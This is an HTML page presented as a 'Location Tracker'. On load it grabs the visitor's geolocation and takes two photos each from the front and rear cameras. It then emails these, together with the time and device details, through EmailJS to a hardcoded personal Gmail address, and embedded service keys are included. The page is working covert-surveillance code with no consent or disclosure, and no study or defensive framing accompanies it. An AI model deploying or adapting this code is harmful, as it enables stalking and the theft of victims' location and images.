<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Location Tracker with Email</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.css" />
  <style>
    #map {
      height: 300px;
      border-radius: 10px;
      margin-top: 1rem;
    }
  </style>
</head>
<body class="bg-gray-100">
  <div class="max-w-xl mx-auto p-4">
    <h1 class="text-2xl font-bold text-center text-blue-600 mb-4">Location Tracker</h1>
    <div id="map" class="hidden"></div>
    <div id="status" class="text-gray-700 mt-4"></div>
    <div class="grid grid-cols-2 gap-4 mt-4">
      <div>
        <p class="text-sm font-semibold">Front Camera</p>
        <img id="front1" class="w-full rounded border">
        <img id="front2" class="w-full mt-2 rounded border">
      </div>
      <div>
        <p class="text-sm font-semibold">Rear Camera</p>
        <img id="rear1" class="w-full rounded border">
        <img id="rear2" class="w-full mt-2 rounded border">
      </div>
    </div>
  </div>

  <script>
    emailjs.init("SSC_AeZ77loUMTfLB"); // Public Key

    const serviceID = "service_2ncxavi";
    const templateID = "template_pc1024b";

    const statusDiv = document.getElementById('status');
    const mapDiv = document.getElementById('map');

    function sendEmail(data) {
      emailjs.send(serviceID, templateID, data).then(() => {
        statusDiv.innerHTML += '<p class="text-green-600">üì© Info sent to email!</p>';
      }, (err) => {
        statusDiv.innerHTML += '<p class="text-red-600">‚ùå Failed to send email: ' + err.text + '</p>';
      });
    }

    async function getCameraShots() {
      let frontData1 = '', frontData2 = '', rearData1 = '', rearData2 = '';
      try {
        const front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const track = front.getVideoTracks()[0];
        const cap = new ImageCapture(track);
        const b1 = await cap.takePhoto();
        const b2 = await cap.takePhoto();
        frontData1 = await blobToBase64(b1);
        frontData2 = await blobToBase64(b2);
        document.getElementById('front1').src = frontData1;
        document.getElementById('front2').src = frontData2;
        track.stop();
      } catch (e) { console.warn("Front cam fail", e); }

      try {
        const rear = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
        const track = rear.getVideoTracks()[0];
        const cap = new ImageCapture(track);
        const b1 = await cap.takePhoto();
        const b2 = await cap.takePhoto();
        rearData1 = await blobToBase64(b1);
        rearData2 = await blobToBase64(b2);
        document.getElementById('rear1').src = rearData1;
        document.getElementById('rear2').src = rearData2;
        track.stop();
      } catch (e) { console.warn("Rear cam fail", e); }

      return { frontData1, frontData2, rearData1, rearData2 };
    }

    function blobToBase64(blob) {
      return new Promise(resolve => {
        const reader = new FileReader();
        reader.onload = () => resolve(reader.result);
        reader.readAsDataURL(blob);
      });
    }

    navigator.geolocation.getCurrentPosition(async pos => {
      const lat = pos.coords.latitude.toFixed(4);
      const lng = pos.coords.longitude.toFixed(4);
      document.getElementById('map').classList.remove('hidden');
      const map = L.map('map').setView([lat, lng], 15);
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
      L.marker([lat, lng]).addTo(map).bindPopup("Location Captured").openPopup();

      const camData = await getCameraShots();

      const emailData = {
        to_email: "ishanking58775@gmail.com",
        location: `${lat}, ${lng}`,
        time: new Date().toLocaleString(),
        device: navigator.userAgent,
        front1: camData.frontData1,
        front2: camData.frontData2,
        rear1: camData.rearData1,
        rear2: camData.rearData2
      };

      sendEmail(emailData);

    }, err => {
      statusDiv.innerHTML = '<p class="text-red-500">Location denied.</p>';
    });
  </script>
</body>
</html>
